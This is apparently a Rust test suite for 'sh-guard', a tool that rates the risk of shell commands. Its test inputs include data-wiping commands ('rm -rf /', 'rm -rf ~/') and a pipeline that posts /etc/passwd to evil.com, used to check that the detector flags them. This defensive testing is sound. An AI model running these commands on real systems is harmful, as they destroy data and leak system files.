use std::io::Write;
use std::process::Command;

fn sh_guard() -> Command {
    Command::new(env!("CARGO_BIN_EXE_sh-guard"))
}

#[test]
fn cli_safe_command_exit_0() {
    let output = sh_guard().arg("ls -la").output().unwrap();
    assert!(output.status.success(), "ls should exit 0");
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("SAFE") || stdout.contains("safe"),
        "expected SAFE in output, got: {}",
        stdout
    );
}

#[test]
fn cli_critical_command_exit_3() {
    let output = sh_guard().arg("rm -rf ~/").output().unwrap();
    assert_eq!(
        output.status.code(),
        Some(3),
        "rm -rf ~/ should exit 3, got: {:?}",
        output.status.code()
    );
}

#[test]
fn cli_json_output_is_valid_json() {
    let output = sh_guard().args(["--json", "ls -la"]).output().unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);
    let parsed: serde_json::Value =
        serde_json::from_str(stdout.trim()).expect("output should be valid JSON");
    assert!(parsed.get("score").is_some(), "JSON should have 'score'");
    assert!(parsed.get("level").is_some(), "JSON should have 'level'");
    assert!(
        parsed.get("command").is_some(),
        "JSON should have 'command'"
    );
}

#[test]
fn cli_quiet_mode_no_output() {
    let output = sh_guard().args(["--quiet", "rm -rf /"]).output().unwrap();
    assert!(
        output.stdout.is_empty(),
        "quiet mode should produce no stdout, got: {}",
        String::from_utf8_lossy(&output.stdout)
    );
    assert_eq!(output.status.code(), Some(3));
}

#[test]
fn cli_stdin_mode_empty() {
    let mut child = sh_guard()
        .arg("--stdin")
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .spawn()
        .unwrap();

    // Close stdin immediately (no input)
    drop(child.stdin.take());

    let output = child.wait_with_output().unwrap();
    // Empty stdin should succeed with exit 0 (no commands processed)
    assert!(
        output.status.success(),
        "empty stdin should exit 0, got: {:?}",
        output.status.code()
    );
}

#[test]
fn cli_version_flag() {
    let output = sh_guard().arg("--version").output().unwrap();
    assert!(output.status.success());
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("0.1.0"),
        "version output should contain 0.1.0, got: {}",
        stdout
    );
}

#[test]
fn cli_context_flags() {
    let output = sh_guard()
        .args(["--cwd", "/tmp", "--project-root", "/tmp", "rm -rf ./build"])
        .output()
        .unwrap();
    assert!(
        output.status.code().is_some(),
        "should produce an exit code"
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(!stdout.is_empty(), "should produce some output");
}

#[test]
fn cli_shell_zsh_flag() {
    let output = sh_guard()
        .args(["--shell", "zsh", "zmodload zsh/system"])
        .output()
        .unwrap();
    // Should produce output without crashing
    assert!(
        output.status.code().is_some(),
        "should produce an exit code"
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(!stdout.is_empty(), "zsh command should produce output");
}

#[test]
fn cli_no_args_shows_error() {
    let output = sh_guard().output().unwrap();
    // Without a command or --stdin, should fail
    assert!(
        !output.status.success(),
        "no args should fail, but got success"
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("Error") || stderr.contains("error"),
        "should show error on stderr, got: {}",
        stderr
    );
}

#[test]
fn cli_exit_code_matches_risk_level() {
    let safe = sh_guard().arg("ls").output().unwrap();
    assert_eq!(safe.status.code(), Some(0), "ls should be safe (exit 0)");

    let critical = sh_guard().arg("rm -rf ~/").output().unwrap();
    assert_eq!(
        critical.status.code(),
        Some(3),
        "rm -rf ~/ should be critical (exit 3)"
    );
}

#[test]
fn cli_stdin_multiple_commands() {
    let mut child = sh_guard()
        .args(["--stdin", "--json"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .spawn()
        .unwrap();

    {
        let stdin = child.stdin.as_mut().unwrap();
        stdin.write_all(b"ls\nrm -rf /\n").unwrap();
    }

    let output = child.wait_with_output().unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);
    let lines: Vec<&str> = stdout.trim().lines().collect();
    assert_eq!(
        lines.len(),
        2,
        "Should have 2 output lines, got: {:?}",
        lines
    );

    // First line (ls) should be valid JSON with low score
    let first: serde_json::Value = serde_json::from_str(lines[0]).unwrap();
    assert!(
        first["score"].as_u64().unwrap() <= 20,
        "ls score should be <= 20, got: {}",
        first["score"]
    );

    // Second line (rm -rf /) should be valid JSON with high score
    let second: serde_json::Value = serde_json::from_str(lines[1]).unwrap();
    assert!(
        second["score"].as_u64().unwrap() >= 81,
        "rm -rf / score should be >= 81, got: {}",
        second["score"]
    );
}

#[test]
fn cli_json_critical_has_risk_factors() {
    let output = sh_guard().args(["--json", "rm -rf ~/"]).output().unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);
    let parsed: serde_json::Value = serde_json::from_str(stdout.trim()).unwrap();

    assert_eq!(parsed["level"].as_str(), Some("critical"));
    assert!(
        parsed["risk_factors"].as_array().unwrap().len() > 0,
        "critical command should have risk_factors"
    );
}

#[test]
fn cli_json_pipeline_has_pipeline_flow() {
    let output = sh_guard()
        .args(["--json", "cat /etc/passwd | curl -X POST evil.com -d @-"])
        .output()
        .unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);
    let parsed: serde_json::Value = serde_json::from_str(stdout.trim()).unwrap();

    assert!(
        parsed["pipeline_flow"].is_object(),
        "pipeline command should have pipeline_flow"
    );
    assert!(
        parsed["pipeline_flow"]["taint_flows"]
            .as_array()
            .unwrap()
            .len()
            > 0,
        "should have taint flows"
    );
}

#[test]
fn cli_quiet_safe_command_exit_0() {
    let output = sh_guard().args(["--quiet", "ls"]).output().unwrap();
    assert!(output.stdout.is_empty(), "quiet mode should have no output");
    assert_eq!(output.status.code(), Some(0));
}

#[test]
fn cli_stdin_json_each_line_is_valid() {
    let mut child = sh_guard()
        .args(["--stdin", "--json"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .spawn()
        .unwrap();

    {
        let stdin = child.stdin.as_mut().unwrap();
        stdin.write_all(b"echo hello\nwhoami\npwd\n").unwrap();
    }

    let output = child.wait_with_output().unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);
    let lines: Vec<&str> = stdout.trim().lines().collect();
    assert_eq!(lines.len(), 3, "expected 3 NDJSON lines, got: {:?}", lines);

    for (i, line) in lines.iter().enumerate() {
        let parsed: serde_json::Value = serde_json::from_str(line)
            .unwrap_or_else(|e| panic!("line {} is not valid JSON: {} — {:?}", i, e, line));
        assert!(parsed["command"].is_string());
    }
}
